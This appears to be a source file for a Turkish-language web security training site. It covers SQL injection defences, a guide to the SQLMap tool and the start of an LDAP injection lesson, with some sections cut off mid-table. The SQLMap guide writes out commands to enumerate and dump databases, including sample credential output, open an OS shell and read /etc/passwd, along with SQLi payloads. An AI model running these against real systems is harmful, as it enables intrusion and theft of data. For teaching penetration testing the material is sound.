        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ Güvenli Node.js / Sequelize ORM Örneği:</span>
const user = await User.findOne({
  where: { username: req.body.username }
});</pre>
        <span class="small" style="color:#f59e0b;">⚠️ UYARI: ORM kullanırken <code>whereRaw()</code> veya <code>DB::raw()</code> gibi ham SQL çalıştıran metodların içine kullanıcı girdisini doğrudan yazmayın!</span>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">3. GİRDİ TİPİ DOĞRULAMA & BEYAZ LİSTE (Allowlisting)</strong>
        <p class="small" style="margin-bottom:5px;">Prepared Statement'lar <b>ORDER BY, ASC/DESC, Tablo Adı ve Kolon Adı</b> gibi yerlerde parametrrik olarak <u>kullanılamaz</u>.<br>Bu alanlar için Beyaz Liste (Allowlist) yöntemi uygulanır.</p>
        
        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ Dynamic ORDER BY Güvenlik Kontrolü:</span>
$allowed_columns = ['id', 'created_at', 'username', 'price'];
$sort_column = $_GET['sort'];

// Eğer gelen değer izin verilen listede yoksa varsayılana ('id') çekilir:
if (!in_array($sort_column, $allowed_columns, true))
{
    $sort_column = 'id';
}

$stmt = $pdo->prepare("SELECT * FROM products ORDER BY $sort_column ASC");
$stmt->execute();</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">4. STORED PROCEDURES (Saklı Yordamlar)</strong>
        <p class="small" style="margin-bottom:5px;">Eğer Stored Procedure yazılıyorsa, prosedürün içinde dinamik SQL (<code>EXECUTE IMMEDIATE</code> veya <code>sp_executesql</code>) concatenation ile kullanılmamalı, parametrik geçilmelidir.</p>
        
        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">-- ✅ Güvenli T-SQL Stored Procedure Örneği:</span>
CREATE PROCEDURE GetUserData
@Username NVARCHAR(50)
AS
BEGIN
SELECT id, email FROM users WHERE username = @Username;
END;</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">5. EN AZ YETKİ PRENSİBİ (Principle of Least Privilege)</strong>
        <p class="small" style="margin-bottom:5px;">Olası bir SQLi durumunda hasarı en aza indirmek için altyapısal önlemler:</p>
        <ul style="margin:5px 0 0 20px;padding:0;list-style-type:disc;">
          <li>Uygulamanın veritabanı kullanıcısı asla <code>root</code>, <code>sa</code> veya <code>DBA</code> yetkisinde olmamalıdır.</li>
          <li>Web uygulamasının veritabanı kullanıcısına 'DROP TABLE', 'ALTER', 'GRANT' yetkileri verilmemelidir.</li>
          <li>Yalnızca ihtiyaç duyulan tablolara 'SELECT, INSERT, UPDATE' izni tanımlanmalıdır.</li>
          <li>Veritabanı sunucusundaki <code>xp_cmdshell</code> (MSSQL) veya 'INTO OUTFILE' (MySQL) gibi dosya sistemi/komut çalıştırma izinleri tamamen kapatılmalıdır.</li>
        </ul>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">6. DETAYLI HATA MESAJLARINI KAPATMAK (Error Handling)</strong>
        <p class="small" style="margin-bottom:5px;">Error-Based SQLi saldırılarını zorlaştırmak için kullanıcıya detaylı veritabanı hatası gösterilmemelidir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// PHP Örneği: Hataları ekrana basmak yerine log dosyasına yaz:</span>
ini_set('display_errors', '0');
ini_set('log_errors', '1');</pre>
      </li>

    </ul>
    </div>
    </details>
  `
        },
        ]

  description: 'SQL Injection zafiyetlerini tespit etmek ve istismar etmek için kullanılan açık kaynaklı otomasyon aracı. Syntax, enumeration teknikleri ve gelişmiş kullanım senaryoları.',
  sections: [
    {
      title: '1. SQLMap Nedir ve Ne Zaman Kullanılır?',
      content: `
        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong>Tanım:</strong> SQLMap, web uygulamalarındaki SQL Injection zafiyetlerini tespit etme ve istismar etme sürecini otomatikleştiren açık kaynaklı bir araçtır.
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong>Desteklenen Veritabanları:</strong> MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, MariaDB (ilişkisel) ve deneysel olarak MongoDB, CouchDB (NoSQL).
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong>Öne Çıkan Özellikler:</strong> Otomatik SQLi tipi tespiti (error-based, time-based, boolean-based, UNION-based), DBMS fingerprinting, veri sızdırma, komut çalıştırma, yetki yükseltme ve GET/POST/Header üzerinden test desteği.
          </li>
        </ul>
        <div class="card" style="margin-top:15px; border-left: 3px solid #ef4444; background:rgba(239,68,68,0.05);">
          <strong style="color:#ef4444; font-size:13px; display:block; margin-bottom:5px;">🚨 Kritik Kural</strong>
          <p class="small" style="margin:0;">Bir zafiyeti önce <b>manuel olarak</b> doğrulayın, ardından SQLMap ile derinleştirin. Doğrudan tam otomatik (yüksek level/risk) tarama yapmak, hedef sistemde çökmelere veya istenmeyen yan etkilere yol açabilir -> Bu, profesyonel olmayan bir yaklaşımdır.</p>
        </div>
        <div class="footer" style="margin-top:10px;">
          <a href="https://sqlmap.org/" target="_blank" style="color:var(--accent);text-decoration:none">Resmi Site: sqlmap.org</a> ·
          <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" style="color:var(--accent);text-decoration:none">GitHub Reposu</a>
        </div>
      `
    },
    {
      title: '2. Temel Syntax ve Çalışma Mantığı (Workflow)',
      content: `
        <p class="small" style="margin-bottom:10px;">SQLMap'in temel iş akışı 5 adımdan oluşur: <b>Injection noktasını bul → DBMS'i tanı → Payload ile doğrula → Veri çek → Gelişmiş istismar.</b></p>
        <div class="card" style="border-left: 2px solid var(--accent);">
          <h4 style="font-size:14px; margin-top:0;">Temel Komut Yapısı</h4>
          <div style="position:relative;">
            <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u &lt;URL&gt; -p &lt;Injection Parametresi&gt; [seçenekler]</pre>
          </div>
          <p class="small" style="margin:10px 0 0 0;"><code>-u</code>: Hedef URL'i belirtir. Parametre belirtmesen bile SQLMap tüm parametreleri otomatik test edebilir.</p>
        </div>

      <div class="tool-io-grid" style="margin-top:12px; width:100%;">
        <div class="card" style="margin-bottom:0; width:100%; grid-column: 1 / -1; box-sizing:border-box;">
          <h4 style="font-size:13px; color:var(--accent); margin:0 0 8px 0;">1. Injection Noktası Tespiti</h4>
          <div style="position:relative; margin-top:5px; width:100%;">
            <pre style="margin:0; white-space:pre-wrap; padding:8px; padding-right:45px; border-radius:6px; background:rgba(0,0,0,0.2); width:100%; box-sizing:border-box;">sqlmap -u "http://example.com/login.php?id=1"</pre>
            </div>
        </div>
      </div><br>
          <div class="card" style="margin-bottom:0;">
            <h4 style="font-size:13px; color:var(--accent);">2. DBMS Fingerprinting</h4>
            <div style="position:relative;margin-top:5px">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/login.php?id=1" --fingerprint</pre>
            </div>
            <div style="background:rgba(0,0,0,0.4); padding:8px; border-radius:6px; margin-top:8px; font-family:monospace; font-size:11px; color:#00ff88;">
              [INFO] The back-end DBMS is MySQL (version: 5.7)
            </div>
          </div>
        </div>

        <div class="card" style="margin-top:12px;">
          <h4 style="font-size:13px; color:var(--secondary);">3. POST İsteği ve Body Verisi ile Test</h4>
          <p class="small" style="margin:0 0 5px 0;">Login formu gibi POST verisi gönderen noktaları test etmek için:</p>
          <div style="position:relative;">
            <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"</pre>
            </div>
        </div>
      `
    },
    {
      title: '3. Database Enumeration (Veritabanı Sıralama)',
      content: `
        <p class="small" style="margin-bottom:10px;">SQLi doğrulandıktan sonra, hedef veritabanının yapısını çıkarmak için sırayla ilerlenir:<br><b>Banner → DBA kontrolü → DB listesi → Tablo listesi → Kolon listesi → Veri dökümü.</b></p>

        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:10px">
          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">3.1- Banner ve Yetki Bilgisi</strong>
            <div style="position:relative;">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u &lt;target&gt; --banner
sqlmap -u &lt;target&gt; --is-dba
sqlmap -u &lt;target&gt; --users</pre>
              </div>
            <p class="small" style="margin-top:6px;"><code>--banner</code> raporlama için zafiyeti kanıtlamada oldukça faydalıdır.<br><code>--is-dba</code> mevcut kullanıcının admin (DBA) yetkisine sahip olup olmadığını,<br><code>--users</code>ise DBMS kullanıcılarını listeler.</p>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">3.2- Veritabanlarını Listeleme</strong>
            <div style="position:relative;">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --dbs</pre>
              </div>
            <div style="background:rgba(0,0,0,0.4); padding:8px; border-radius:6px; margin-top:8px; font-family:monospace; font-size:11px; color:#00ff88;">
              Available databases:<br>[1] information_schema<br>[2] users_db
            </div>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">3.3- Tabloları Listeleme</strong>
            <div style="position:relative;">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" -D users_db --tables</pre>
              </div>
            <div style="background:rgba(0,0,0,0.4); padding:8px; border-radius:6px; margin-top:8px; font-family:monospace; font-size:11px; color:#00ff88;">
              Tables in users_db:<br>[1] user_credentials<br>[2] user_profiles
            </div>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">3.4- Kolonları Listeleme</strong>
            <div style="position:relative;">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u &lt;target&gt; -D &lt;database&gt; -T &lt;tablo_adi&gt; --columns</pre>
              </div>
          </li>

          <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);display:block;margin-bottom:6px;">3.5- Veriyi Dökme (Dump) - Exploit Adımı</strong>
            <div style="position:relative;">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u &lt;target&gt; -D &lt;database&gt; -T &lt;tablo&gt; -C &lt;kolon1,kolon2&gt; --dump</pre>
              </div>
            <div style="background:rgba(0,0,0,0.4); padding:8px; border-radius:6px; margin-top:8px; font-family:monospace; font-size:11px; color:#00ff88;">
              Dumping table 'user_credentials':<br>+----------+----------+<br>| username | password |<br>+----------+----------+<br>| admin    | pass123  |<br>| user1    | secret42 |<br>+----------+----------+
            </div>
          </li>
        </ul>
      `
    },
    {
      title: '4. Detection Options: --level ve --risk',
      content: `
        <p class="small" style="margin-bottom:10px;">Bu iki parametre, taramanın <b>derinliğini</b> (nereleri test edeceğini) ve <b>agresifliğini</b> (ne kadar riskli payload göndereceğini) kontrol eder.<br>Testin kapsamına ve hassasiyetine göre dikkatli seçilmelidir.</p>

        <div style="overflow-x:auto;">
          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted);">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">--level</th>
                <th style="text-align:left;padding:8px;color:var(--accent);">Açıklama</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><b>1 (Varsayılan)</b></td><td style="padding:8px;">Sadece GET/POST parametrelerini test eder.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><b>2</b></td><td style="padding:8px;">Cookie ve User-Agent gibi HTTP başlıklarını da dahil eder.</td></tr>
              <tr><td style="padding:8px;"><b>3</b></td><td style="padding:8px;">Referer, özel header'lar ve diğer olası injection noktalarını da test eder.</td></tr>
            </tbody>
          </table>
        </div>

        <div style="overflow-x:auto; margin-top:12px;">
          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted);">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">--risk</th>
                <th style="text-align:left;padding:8px;color:var(--secondary);">Açıklama</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><b>1 (Varsayılan)</b></td><td style="padding:8px;">Düşük risk - sadece yıkıcı olmayan (non-destructive) testler.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><b>2</b></td><td style="padding:8px;">Orta risk - sunucuya küçük etkileri olabilecek sorgular (time-based vb.) eklenir.</td></tr>
              <tr><td style="padding:8px;"><b>3</b></td><td style="padding:8px;">Yüksek risk - stacked queries gibi potansiyel yıkıcı/yavaşlatıcı işlemler dahil edilir.</td></tr>
            </tbody>
          </table>
        </div>

        <div class="card" style="margin-top:12px; border-left: 2px solid var(--accent);">
          <h4 style="font-size:13px; margin-top:0; color:var(--accent);">Örnekler</h4>
          <div style="position:relative;">
            <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --level=2
sqlmap -u "http://example.com/product.php?id=1" --risk=2
sqlmap -u "http://example.com/product.php?id=1" --level=3 --risk=3</pre>
            </div>
        </div>

        <div class="card" style="margin-top:12px; border-left: 3px solid #ef4444; background:rgba(239,68,68,0.05);">
          <strong style="color:#ef4444; font-size:13px; display:block; margin-bottom:5px;">⚠️ Dikkat</strong>
          <p class="small" style="margin:0;">Hedef uygulamayı iyice incelemeden hem <code>--level=3</code> hem <code>--risk=3</code> ile tam otomatik tarama başlatmak, müşteri altyapısında sorunlara<br>(performans düşüşü, servis kesintisi) yol açabilir. Bu kombinasyonu yalnızca gerekli olduğunda ve dikkatli kullanın.</p>
        </div>
      `
    },
    {
      title: '5. SQLi Teknik Seçimi (--technique)',
      content: `
        <p class="small" style="margin-bottom:10px;">Varsayılan olarak SQLMap tüm teknikleri sırayla dener. Belirli bir tekniğe odaklanmak (daha hızlı/hedefli test için) <code>--technique</code> parametresi ile mümkündür.</p>

        <div style="overflow-x:auto;">
          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted);">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">Kod</th>
                <th style="text-align:left;padding:8px;color:var(--accent);">Teknik</th>
                <th style="text-align:left;padding:8px;color:var(--secondary);">Açıklama</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>B</code></td><td style="padding:8px;">Boolean-Based Blind</td><td style="padding:8px;">Doğru/yanlış koşullarıyla bilgi çıkarımı yapar.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>E</code></td><td style="padding:8px;">Error-Based</td><td style="padding:8px;">Veritabanı hata mesajlarından bilgi sızdırır.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>U</code></td><td style="padding:8px;">UNION-Based</td><td style="padding:8px;"><code>UNION</code> operatörü ile veri çeker.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>S</code></td><td style="padding:8px;">Stacked Queries</td><td style="padding:8px;">Tek istekte birden fazla sorgu çalıştırır (destekleniyorsa).</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>T</code></td><td style="padding:8px;">Time-Based Blind</td><td style="padding:8px;">Yanıt gecikmesi ile doğru/yanlış koşulunu ölçer.</td></tr>
              <tr><td style="padding:8px;"><code>Q</code></td><td style="padding:8px;">Inline Queries</td><td style="padding:8px;">Subquery kullanarak veri çıkarır (nadir kullanılır).</td></tr>
            </tbody>
          </table>
        </div>

        <div class="tool-io-grid" style="margin-top:12px;">
          <div class="card" style="margin-bottom:0;">
            <h4 style="font-size:13px; color:var(--accent);">Boolean-Based Örneği</h4>
            <div style="position:relative;margin-top:5px">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --technique=B</pre>
              </div>
            <p class="small" style="margin-top:6px;">Arka planda <code>' AND 1=1--</code> (true) ve <code>' AND 1=2--</code> (false) payloadları test edilir.</p>
          </div>
          <div class="card" style="margin-bottom:0;">
            <h4 style="font-size:13px; color:var(--accent);">Error-Based Örneği</h4>
            <div style="position:relative;margin-top:5px">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --technique=E</pre>
             </div>
            <p class="small" style="margin-top:6px;">Örnek payload: <code>1' AND extractvalue(1, concat(0x3a, version()))--</code></p>
          </div>
        </div>
      `
    },
    {
      title: '6. Kimlik Doğrulama ve Özel Header\'lar',
      content: `
        <p class="small" style="margin-bottom:10px;">Giriş yapılması gereken (session/cookie ile korunan) endpoint'leri test etmek için oturum bilgisini SQLMap'e iletmek gerekir.</p>
        <div class="card" style="border-left: 2px solid var(--accent);">
          <div style="position:relative;">
            <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --cookie="PHPSESSID=abc123"</pre>
            </div>
          <p class="small" style="margin-top:8px;">Aynı mantıkla <code>--headers</code> parametresi ile birden fazla özel header (Authorization, X-Api-Key vb.) tek seferde gönderilebilir.</p>
        </div>
      `
    },
    {
      title: '7. Gelişmiş İstismar (Advanced Exploitation)',
      content: `
        <p class="small" style="margin-bottom:10px;">SQLi zafiyeti doğrulandıktan ve DBMS ayrıcalıkları yeterli olduktan sonra SQLMap, veri sızdırmanın ötesine geçip işletim sistemi seviyesinde erişim sağlayabilir.</p>
        <div class="tool-io-grid">
          <div class="card" style="margin-bottom:0; border: 1px solid rgba(239,68,68,0.3);">
            <h4 style="font-size:13px; color:#ef4444;">OS Shell Açma</h4>
            <div style="position:relative;margin-top:5px">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --os-shell</pre>
              </div>
            <p class="small" style="margin-top:6px;">Yalnızca komut çalıştırma yeteneği olan (ör. stacked queries destekleyen) DBMS'lerde çalışır.</p>
          </div>
          <div class="card" style="margin-bottom:0; border: 1px solid rgba(139,92,246,0.3);">
            <h4 style="font-size:13px; color:var(--accent);">Dosya Okuma</h4>
            <div style="position:relative;margin-top:5px">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -u "http://example.com/product.php?id=1" --file-read="/etc/passwd"</pre>
              </div>
          </div>
        </div>
      `
    },
    {
      title: '8. Burp Suite Entegrasyonu (Intercepted Request Kullanımı)',
      content: `
        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            Burp Proxy ile yakalanan bir isteği <code>.txt</code> dosyası olarak kaydedip ("Save item"), SQLMap'e doğrudan bu dosyayı vererek tüm header'ları, cookie'leri ve body verisini olduğu gibi kullanabilirsiniz. Bu yöntem, kompleks POST/JSON istekleri veya çoklu header gerektiren senaryolarda manuel parametre yazmaktan çok daha güvenilirdir.
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <div style="position:relative;">
              <pre style="margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)">sqlmap -r &lt;request_dosyasi.txt&gt; -p &lt;parametre&gt; [seçenekler]</pre>
              </div>
          </li>
        </ul>
      `
    },
    {
      title: '9. Komut Referans Tabloları',
      content: `
        <h4 style="font-size:14px; color:var(--accent); margin-bottom:8px;">Genel Amaçlı Seçenekler</h4>
        <div style="overflow-x:auto; margin-bottom:16px;">
          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted);">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">Seçenek</th>
                <th style="text-align:left;padding:8px;color:var(--secondary);">Açıklama</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>-u, --url=URL</code></td><td style="padding:8px;">Hedef URL'i belirtir.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>--data=&lt;DATA&gt;</code></td><td style="padding:8px;">POST parametrelerini belirtilen veriyle test eder.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;"><code>-p &lt;PARAM&gt;</code></td><td style="padding:8px;">Test edilecek parametre(ler).</td></tr>

ldapi: {
  menuName: 'LDAP Injection',
  icon: 'icon-network-node',
  parent: 'vulnerabilities',
  title: 'LDAP Injection',
  description: 'LDAP Injection, kullanıcıdan alınan girdinin gerektiği gibi doğrulanmadan LDAP sorgularına dahil edilmesi sonucu saldırganların dizin servisi üzerindeki sorgu mantığını manipüle etmesine, kimlik doğrulamayı atlatmasına veya yetkisiz veri sızdırmasına olanak tanıyan bir güvenlik açığıdır.',
  sections: [
    {
      title: "1. LDAP Nedir? Temel Kavramlar",
      content: `
        <p class="small" style="margin-bottom:15px;">LDAP Injection'ı anlayabilmek için öncelikle hedefin ne olduğunu, yani LDAP protokolünü ve dizin servisinin (directory service) nasıl yapılandığını bilmek gerekir.<br>LDAP (Lightweight Directory Access Protocol), dizin servislerini TCP/IP üzerinden sorgulamak ve değiştirmek için kullanılan bir protokoldür.<br>Kendisi bir depolama mekanizması değildir; yalnızca dizin verisine erişim sağlayan bir arayüzdür.</p>

        <div class="card" style="margin-bottom:15px; border-left: 2px solid var(--secondary); background:rgba(6,182,212,0.05);">
          <strong style="color:var(--secondary); font-size:12px;">Web Uygulamaları LDAP'ı Nerede Kullanır?</strong>
          <ul style="margin:8px 0 0 20px;padding:0;list-style-type:disc;color:var(--muted);font-size:14px;">
            <li><b>Authentication:</b> Kullanıcı adı/şifre çiftini dizindeki kayıtlarla doğrular.</li>
            <li><b>Authorization:</b> Kullanıcının rol ve yetkilerini dizinden sorgular.</li>
            <li><b>Query:</b> Kullanıcı veya organizasyon bilgilerini dizinden çeker.</li>
          </ul>
          <p class="small" style="margin:8px 0 0 0;">Örnek: Bir kurumsal portal, çalışanları Microsoft Active Directory veya OpenLDAP gibi bir sunucu üzerinden doğrulayabilir.</p>
        </div>

        <h4 style="font-size:14px; color:var(--accent); margin-bottom:8px;">LDAP Portları</h4>
        <div style="overflow-x:auto; margin-bottom:15px;">
          <table style="width:100%;border-collapse:collapse;font-size:13px;color:var(--muted); background: rgba(255,255,255,0.02); border-radius:8px; overflow:hidden;">
            <thead>
              <tr style="border-bottom:1px solid var(--glass);">
                <th style="text-align:left;padding:8px;color:#cbd5e1;">Port</th>
                <th style="text-align:left;padding:8px;color:var(--accent);">Protokol</th>
                <th style="text-align:left;padding:8px;color:var(--secondary);">Açıklama</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">389</td><td style="padding:8px;">LDAP</td><td style="padding:8px;">Düz metin (plaintext) LDAP iletişimi için varsayılan port.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">636</td><td style="padding:8px;">LDAPS</td><td style="padding:8px;">SSL/TLS ile şifreli LDAP iletişimi için varsayılan port.</td></tr>
              <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">3268</td><td style="padding:8px;">Global Catalog</td><td style="padding:8px;">Düz metin üzerinden Global Catalog erişimi.</td></tr>
              <tr><td style="padding:8px;">3269</td><td style="padding:8px;">Global Catalog LDAPS</td><td style="padding:8px;">Şifreli Global Catalog erişimi.</td></tr>
            </tbody>
          </table>
        </div>

        <h4 style="font-size:14px; color:var(--accent); margin-bottom:8px;">Dizin Yapısı (Directory Information Tree - DIT)</h4>
        <p class="small" style="margin-bottom:10px;">LDAP veritabanı, hiyerarşik bir ağaç yapısı (DIT) olarak organize edilir:</p>
        <ul style="list-style:none;padding:0;margin:0 0 15px 0;display:grid;gap:10px">
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);">Root (Kök):</strong> Hiyerarşinin en üst noktası. Genellikle organizasyonun domain adıyla tanımlanır (örn. <code>dc=example,dc=com</code>).
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);">OU (Organizational Unit):</strong> İlgili kayıtları gruplayan mantıksal konteynerler. Örn: <code>ou=Users</code>, <code>ou=Groups</code>.
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);">Entry (Kayıt):</strong> Bir kullanıcı, grup veya cihaz gibi tekil bir nesneyi temsil eder.<br>Her entry, ağaçtaki konumunu belirten benzersiz bir <b>Distinguished Name (DN)</b> ile tanımlanır.<br>Örnek DN: <code>cn=John Doe,ou=Users,dc=example,dc=com</code>
          </li>
          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
            <strong style="color:var(--accent);">Attribute (Öznitelik):</strong> Bir kaydı tanımlayan key-value çiftleri. Örn: <code>cn (common name): John Doe</code>, <code>mail: john.doe@example.com</code>
          </li>
        </ul>

        <div class="card" style="border-left: 2px solid var(--secondary); background:rgba(6,182,212,0.05);">
          <strong style="color:var(--secondary); font-size:12px;">Örnek DIT Görselleştirmesi</strong>
          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">dc=example,dc=com                <- Root
 ├── ou=Users
 │     ├── cn=John Doe
 │     └── cn=Jane Smith
 └── ou=Groups
       ├── cn=Admins
       └── cn=Developers</pre>
        </div>

        <h4 style="font-size:14px; color:var(--accent); margin:15px 0 8px 0;">LDIF (LDAP Data Interchange Format)</h4>
        <p class="small" style="margin-bottom:10px;">Dizin servisindeki nesneler LDIF formatında saklanır/temsil edilir. LDIF, dizin kayıtlarını (ekleme, güncelleme, silme dahil) temsil eden düz metin tabanlı standart bir formattır.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">dn: dc=org
dc: org
objectClass: dcObject

dn: dc=samplecompany,dc=org
dc: samplecompany
objectClass: dcObject
objectClass: organization

dn: ou=it,dc=samplecompany,dc=org
objectClass: organizationalUnit
ou: it

dn: cn= ,ou= ,dc=samplecompany,dc=org
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail:
phone:</pre>
        <p class="small" style="margin-top:8px;color:#64748b;">sn: surname (soyisim) &nbsp;|&nbsp; cn: canonical/common name (isim) &nbsp;|&nbsp; mail: e-posta adresi</p>
      `
    },
    {
      title: "2. LDAP Sorgu Syntax'ı (Filter Syntax)",
      content: `
        <p class="small" style="margin-bottom:15px;">LDAP Injection'ın nasıl çalıştığını anlayabilmek için, LDAP'ın arka planda sorgu (filter) oluşturma mantığını bilmek şarttır. LDAP sorguları, SQL'in aksine <b>prefix (Polish) notation</b> kullanır - yani operatör, ifadelerden önce gelir.</p>

        <h4 style="font-size:14px; color:var(--accent); margin-bottom:8px;">Operatörler</h4>
        <div style="overflow-x:auto; margin-bottom:15px;">
